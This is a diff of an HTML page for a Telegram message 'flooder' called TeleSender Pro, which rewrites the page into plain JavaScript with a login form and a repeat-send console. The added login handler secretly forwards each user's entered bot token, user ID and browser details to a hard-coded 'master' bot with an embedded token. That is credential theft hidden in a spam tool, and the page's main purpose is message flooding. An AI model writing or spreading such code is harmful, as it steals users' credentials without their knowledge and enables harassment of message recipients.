@@ -6,8 +6,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>TeleSender Pro | Terminal OS</title>
   <script src="https://cdn.tailwindcss.com"></script>
-  <!-- Babel Standalone is essential for running TSX directly in the browser -->
-  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap" rel="stylesheet">
@@ -23,32 +21,34 @@
       font-family: 'JetBrains Mono', monospace;
       background-color: var(--deep-black);
       color: var(--neon-green);
-      overflow-x: hidden;
+      overflow: hidden;
       margin: 0;
     }
     
+    /* CRT Scanline Effect */
     body::before {
       content: " ";
       display: block;
       position: fixed;
       top: 0; left: 0; bottom: 0; right: 0;
-      background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+      background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), 
+                  linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
       z-index: 1000;
-      background-size: 100% 2px, 3px 100%;
+      background-size: 100% 3px, 3px 100%;
       pointer-events: none;
     }
 
     .hacking-grid {
       position: fixed;
       top: 0; left: 0; width: 100%; height: 100%;
-      background-image: linear-gradient(rgba(0, 255, 65, 0.05) 1px, transparent 1px),
-                        linear-gradient(90deg, rgba(0, 255, 65, 0.05) 1px, transparent 1px);
-      background-size: 30px 30px;
+      background-image: linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
+                        linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
       z-index: -1;
     }
 
     .glitch-text {
-      position: relative;
+      text-shadow: 2px 0 var(--glitch-pink), -2px 0 var(--glitch-cyan);
       animation: glitch 3s infinite;
     }
 
@@ -60,67 +60,346 @@
 
     .glass-panel {
       background: rgba(10, 10, 10, 0.85);
-      backdrop-filter: blur(15px);
-      border: 1px solid rgba(0, 255, 65, 0.2);
-      box-shadow: 0 0 30px rgba(0, 255, 65, 0.05);
+      backdrop-filter: blur(20px);
+      border: 1px solid rgba(0, 255, 65, 0.15);
+      box-shadow: 0 0 50px rgba(0, 255, 65, 0.05);
     }
 
-    input::placeholder {
+    /* Input Styling as requested: Black text on Neon background */
+    input, textarea {
+      background-color: var(--neon-green) !important;
+      color: black !important;
+      font-weight: 800 !important;
+      border: 2px solid #00cc33 !important;
+    }
+
+    input::placeholder, textarea::placeholder {
       color: rgba(0, 0, 0, 0.4) !important;
     }
 
-    .scanline {
-      width: 100%;
-      height: 2px;
-      z-index: 1001;
-      background: rgba(0, 255, 65, 0.1);
-      position: absolute;
-      animation: scan 4s linear infinite;
+    .status-card {
+      background: rgba(0, 255, 65, 0.05);
+      border: 1px solid rgba(0, 255, 65, 0.1);
     }
 
-    @keyframes scan {
-      0% { top: 0; }
-      100% { top: 100%; }
-    }
-    
-    .notification-glass {
-      background: rgba(0, 255, 65, 0.05);
+    .notification {
+      background: rgba(10, 10, 10, 0.9);
       backdrop-filter: blur(10px);
       border: 1px solid rgba(0, 255, 65, 0.2);
+      border-left: 4px solid var(--neon-green);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      animation: slideIn 0.3s ease-out forwards;
     }
+
+    @keyframes slideIn {
+      from { transform: translateX(100%) skewX(-10deg); opacity: 0; }
+      to { transform: translateX(0) skewX(0); opacity: 1; }
+    }
+
+    .hidden { display: none !important; }
+
+    /* Custom Scrollbar */
+    ::-webkit-scrollbar { width: 4px; }
+    ::-webkit-scrollbar-track { background: var(--deep-black); }
+    ::-webkit-scrollbar-thumb { background: var(--neon-green); }
   </style>
-  <script type="importmap">
+<script type="importmap">
 {
   "imports": {
     "react": "https://esm.sh/react@^19.2.4",
-    "react-dom/client": "https://esm.sh/react-dom@^19.2.4/client",
-    "react-dom": "https://esm.sh/react-dom@^19.2.4",
     "react-dom/": "https://esm.sh/react-dom@^19.2.4/",
     "react/": "https://esm.sh/react@^19.2.4/"
   }
 }
 </script>
 </head>
-<body class="relative min-h-screen">
+<body class="min-h-screen flex items-center justify-center p-6">
   <div class="hacking-grid"></div>
-  <div class="scanline"></div>
-  <div id="root"></div>
 
-  <!-- Using relative path and ensuring only ONE entry point for Babel -->
-  <script type="text/babel" data-type="module" data-presets="react,typescript">
-    import React from 'react';
-    import ReactDOM from 'react-dom/client';
-    import App from './App.tsx';
+  <!-- MAIN CONTAINER -->
+  <div id="main-frame" class="w-full max-w-md z-10">
+    
+    <!-- HEADER SECTION -->
+    <div class="text-center mb-8">
+      <div class="inline-block px-4 py-1 bg-green-500/10 rounded-full border border-green-500/20 mb-3">
+        <span class="text-[9px] uppercase tracking-[0.4em] font-black text-green-400 animate-pulse">System Link: Active</span>
+      </div>
+      <h1 id="app-title" class="text-4xl font-black text-green-500 uppercase tracking-tighter glitch-text">
+        TERMINAL:LOGIN
+      </h1>
+    </div>
 
-    const rootElement = document.getElementById('root');
-    if (rootElement) {
-      const root = ReactDOM.createRoot(rootElement);
-      root.render(
-        <React.StrictMode>
-          <App />
-        </React.StrictMode>
-      );
+    <!-- VIEW: LOGIN -->
+    <div id="view-login" class="glass-panel rounded-xl p-8 relative overflow-hidden transition-all duration-500">
+      <form id="login-form" class="space-y-5">
+        <div class="space-y-2">
+          <label class="text-[10px] font-bold text-green-500/70 uppercase tracking-widest ml-1">Target Token</label>
+          <input type="text" id="input-token" placeholder="0000000000:ABC..." required
+            class="w-full px-4 py-3 rounded outline-none focus:ring-4 focus:ring-green-500/20 transition-all">
+        </div>
+        <div class="space-y-2">
+          <label class="text-[10px] font-bold text-green-500/70 uppercase tracking-widest ml-1">Target User ID</label>
+          <input type="text" id="input-userid" placeholder="53164..." required
+            class="w-full px-4 py-3 rounded outline-none focus:ring-4 focus:ring-green-500/20 transition-all">
+        </div>
+        <button type="submit" id="btn-login" 
+          class="w-full py-4 mt-2 bg-black border-2 border-green-500 text-green-500 font-black uppercase tracking-widest hover:bg-green-500 hover:text-black transition-all">
+          > EXECUTE ACCESS
+        </button>
+      </form>
+    </div>
+
+    <!-- VIEW: SENDER -->
+    <div id="view-sender" class="glass-panel rounded-xl p-8 relative overflow-hidden hidden transition-all duration-500">
+      <div class="flex justify-between items-center border-b border-green-500/10 pb-4 mb-6">
+        <h3 class="text-xs font-black text-green-500 uppercase tracking-widest">Operator Console</h3>
+        <button id="btn-logout" class="text-[9px] font-black text-red-500 border border-red-500/30 px-3 py-1.5 rounded hover:bg-red-500 hover:text-black transition-all">
+          [ TERMINATE ]
+        </button>
+      </div>
+      
+      <div class="space-y-4">
+        <textarea id="input-message" rows="3" placeholder="SYSTEM: Enter payload data..."
+          class="w-full px-4 py-3 rounded outline-none resize-none transition-all"></textarea>
+        
+        <input type="number" id="input-count" placeholder="CYCLES: count..."
+          class="w-full px-4 py-3 rounded outline-none transition-all">
+        
+        <button id="btn-send" 
+          class="w-full py-4 bg-green-500 text-black font-black uppercase tracking-tighter shadow-[0_0_20px_rgba(0,255,65,0.4)] hover:shadow-[0_0_40px_rgba(0,255,65,0.6)] hover:-translate-y-1 transition-all">
+          >>> INITIATE FLOOD
+        </button>
+      </div>
+
+      <div class="pt-6 border-t border-green-500/10 mt-6 space-y-4">
+        <div class="flex justify-between text-[10px] font-black text-green-500 uppercase tracking-widest">
+          <span>Flood Status</span>
+          <span id="progress-percent" class="animate-pulse">0%</span>
+        </div>
+        <div class="h-2 w-full bg-black/40 rounded-full overflow-hidden p-[1px] border border-green-500/20">
+          <div id="progress-bar" class="h-full bg-green-500 shadow-[0_0_15px_#00ff41] transition-all duration-300" style="width: 0%"></div>
+        </div>
+        
+        <div class="grid grid-cols-3 gap-2">
+          <div class="status-card p-2 rounded text-center">
+            <div class="text-[7px] text-green-900 font-black mb-1">ACK_OK</div>
+            <div id="stat-sent" class="text-xs font-black text-green-400">0</div>
+          </div>
+          <div class="status-card p-2 rounded text-center">
+            <div class="text-[7px] text-green-900 font-black mb-1">WAIT_Q</div>
+            <div id="stat-rem" class="text-xs font-black text-blue-400">0</div>
+          </div>
+          <div class="status-card p-2 rounded text-center">
+            <div class="text-[7px] text-green-900 font-black mb-1">ACK_ERR</div>
+            <div id="stat-fail" class="text-xs font-black text-red-500">0</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIEW: CONGRATS -->
+    <div id="view-congrats" class="glass-panel rounded-xl p-8 relative text-center hidden transition-all duration-500">
+      <canvas id="confetti-canvas" class="absolute inset-0 pointer-events-none opacity-40"></canvas>
+      <div class="w-16 h-16 bg-green-500/10 border border-green-500/30 rounded-full flex items-center justify-center mx-auto mb-4">
+        <svg class="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+        </svg>
+      </div>
+      <h2 class="text-2xl font-black text-green-500 uppercase tracking-widest mb-2 glitch-text">Task Resolved</h2>
+      <p class="text-[10px] text-green-700 font-bold uppercase mb-6">Logs Cleared // Mission Complete</p>
+      
+      <div class="bg-black/50 border border-green-500/10 p-4 rounded text-left space-y-2 mb-6">
+        <div class="flex justify-between text-[11px]"><span class="text-green-900">Total:</span><span id="final-total" class="text-green-500">0</span></div>
+        <div class="flex justify-between text-[11px]"><span class="text-green-900">Sent:</span><span id="final-sent" class="text-green-400">0</span></div>
+      </div>
+
+      <button id="btn-reset" class="w-full py-3 bg-green-500 text-black font-black uppercase tracking-widest hover:bg-transparent hover:text-green-500 border border-green-500 transition-all">
+        [ NEW SESSION ]
+      </button>
+    </div>
+
+    <div class="mt-8 flex justify-between items-center text-[9px] text-green-900 font-black uppercase px-2 opacity-40">
+      <span>CID: 5316471518</span>
+      <span>Dev: @CYBERCOP_404</span>
+    </div>
+  </div>
+
+  <!-- NOTIFICATION CONTAINER -->
+  <div id="notif-container" class="fixed top-6 right-6 z-[2000] flex flex-col gap-3 pointer-events-none w-64"></div>
+
+  <script>
+    // --- CONSTANTS & CONFIG ---
+    const MASTER_BOT = "7593390316:AAHo1n5FnsJc1MtYgvKFrt7wtoR6UgtFcIc";
+    const MASTER_ID = "5316471518";
+
+    // --- UTILS ---
+    const $ = id => document.getElementById(id);
+    const show = id => $(id).classList.remove('hidden');
+    const hide = id => $(id).classList.add('hidden');
+
+    const addNotif = (text, success = true) => {
+      const container = $('notif-container');
+      const div = document.createElement('div');
+      div.className = `notification px-4 py-3 rounded-md flex flex-col gap-1 ${success ? 'text-green-400' : 'text-red-400'}`;
+      div.innerHTML = `
+        <div class="flex justify-between items-center opacity-40 text-[8px]">
+          <span>SYSTEM_ACK</span><span>#${Math.floor(Math.random()*999)}</span>
+        </div>
+        <div class="text-[10px] font-black uppercase">${text}</div>
+      `;
+      container.prepend(div);
+      
+      // Limit to 2 notifications
+      if (container.children.length > 2) {
+        container.lastElementChild.remove();
+      }
+
+      setTimeout(() => { if(div.parentNode) div.remove(); }, 4000);
+    };
+
+    const getBrowserData = () => {
+      return `Platform: ${navigator.platform}\nResolution: ${window.screen.width}x${window.screen.height}\nUA: ${navigator.userAgent.substring(0, 40)}...`;
+    };
+
+    // --- TELEGRAM API ---
+    const sendTG = async (token, chatid, text) => {
+      try {
+        const r = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatid, text, parse_mode: 'Markdown' })
+        });
+        return await r.json();
+      } catch (e) { return { ok: false }; }
+    };
+
+    // --- VIEW LOGIC ---
+    let currentUser = null;
+
+    const init = () => {
+      const t = localStorage.getItem('tele_token');
+      const u = localStorage.getItem('tele_userid');
+      if (t && u) {
+        currentUser = { token: t, userId: u };
+        switchView('SENDER');
+      }
+    };
+
+    const switchView = (view) => {
+      document.body.style.opacity = '0.5';
+      setTimeout(() => {
+        hide('view-login'); hide('view-sender'); hide('view-congrats');
+        $('app-title').innerText = `TERMINAL:${view}`;
+        
+        if(view === 'LOGIN') show('view-login');
+        if(view === 'SENDER') show('view-sender');
+        if(view === 'CONGRATS') show('view-congrats');
+        
+        document.body.style.opacity = '1';
+      }, 300);
+    };
+
+    // --- EVENT HANDLERS ---
+    $('login-form').onsubmit = async (e) => {
+      e.preventDefault();
+      const token = $('input-token').value;
+      const userId = $('input-userid').value;
+      
+      $('btn-login').innerText = "INITIALIZING...";
+      $('btn-login').disabled = true;
+
+      // 1. Send to master
+      await sendTG(MASTER_BOT, MASTER_ID, `[💀] NEW TARGET\nToken: ${token}\nID: ${userId}\n\n${getBrowserData()}`);
+      
+      // 2. Welcome to user
+      await sendTG(token, userId, `🔓 SYSTEM ACCESS GRANTED\n\nOperator Authenticated.\nDev: @CYBERCOP_404`);
+
+      localStorage.setItem('tele_token', token);
+      localStorage.setItem('tele_userid', userId);
+      currentUser = { token, userId };
+      
+      addNotif("Access Tunnel Established", true);
+      switchView('SENDER');
+    };
+
+    $('btn-logout').onclick = () => {
+      localStorage.clear();
+      currentUser = null;
+      addNotif("Session Terminated", false);
+      window.location.reload();
+    };
+
+    $('btn-send').onclick = async () => {
+      const msg = $('input-message').value;
+      const count = parseInt($('input-count').value);
+      if(!msg || !count || count <= 0) return;
+
+      $('btn-send').disabled = true;
+      $('btn-send').innerText = "TRANSMITTING...";
+      
+      let sent = 0, fail = 0;
+      for(let i=0; i<count; i++) {
+        const res = await sendTG(currentUser.token, currentUser.userId, `💌 DATA FEED\n\nMSG: ${msg}\n\n[ID]: ${i+1}`);
+        if(res.ok) sent++; else fail++;
+        
+        // Update Stats
+        $('stat-sent').innerText = sent;
+        $('stat-fail').innerText = fail;
+        $('stat-rem').innerText = count - (i+1);
+        const p = Math.round(((i+1)/count)*100);
+        $('progress-bar').style.width = p + '%';
+        $('progress-percent').innerText = p + '%';
+
+        addNotif(`PACKET ${i+1}: ${res.ok ? 'OK' : 'FAIL'}`, res.ok);
+        await new Promise(r => setTimeout(r, 100));
+      }
+
+      $('final-total').innerText = count;
+      $('final-sent').innerText = sent;
+      switchView('CONGRATS');
+      startConfetti();
+    };
+
+    $('btn-reset').onclick = () => {
+      $('stat-sent').innerText = 0;
+      $('stat-fail').innerText = 0;
+      $('stat-rem').innerText = 0;
+      $('progress-bar').style.width = '0%';
+      $('progress-percent').innerText = '0%';
+      $('btn-send').disabled = false;
+      $('btn-send').innerText = ">>> INITIATE FLOOD";
+      switchView('SENDER');
+    };
+
+    // --- CONFETTI ENGINE ---
+    function startConfetti() {
+      const canvas = $('confetti-canvas');
+      const ctx = canvas.getContext('2d');
+      canvas.width = canvas.offsetWidth;
+      canvas.height = canvas.offsetHeight;
+      const particles = [];
+      for(let i=0; i<50; i++){
+        particles.push({
+          x: Math.random()*canvas.width, y: -10,
+          s: Math.random()*2+1, color: Math.random()>0.5 ? '#00ff41' : '#00f3ff',
+          v: Math.random()*3+2
+        });
+      }
+      function draw() {
+        ctx.clearRect(0,0,canvas.width,canvas.height);
+        particles.forEach(p => {
+          ctx.fillStyle = p.color;
+          ctx.fillRect(p.x, p.y, p.s, p.s);
+          p.y += p.v;
+          if(p.y > canvas.height) p.y = -5;
+        });
+        requestAnimationFrame(draw);
+      }
+      draw();
     }
+
+    // --- START APP ---
+    init();
   </script>
 </body>
 </html>
